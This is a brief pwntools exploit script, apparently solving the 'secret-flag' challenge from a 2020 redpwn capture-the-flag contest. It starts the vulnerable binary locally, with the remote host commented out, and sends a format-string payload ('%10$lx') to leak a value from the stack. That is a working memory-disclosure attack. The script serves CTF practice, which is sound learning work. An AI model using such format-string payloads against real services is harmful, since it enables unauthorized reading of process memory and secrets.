from pwn import *
context.update(log_level='debug')

#p = remote('2020.redpwnc.tf',31826)
p = process('secret-flag')


p.recvrepeat(1)


p.sendline('%10$lx')


p.interactive()
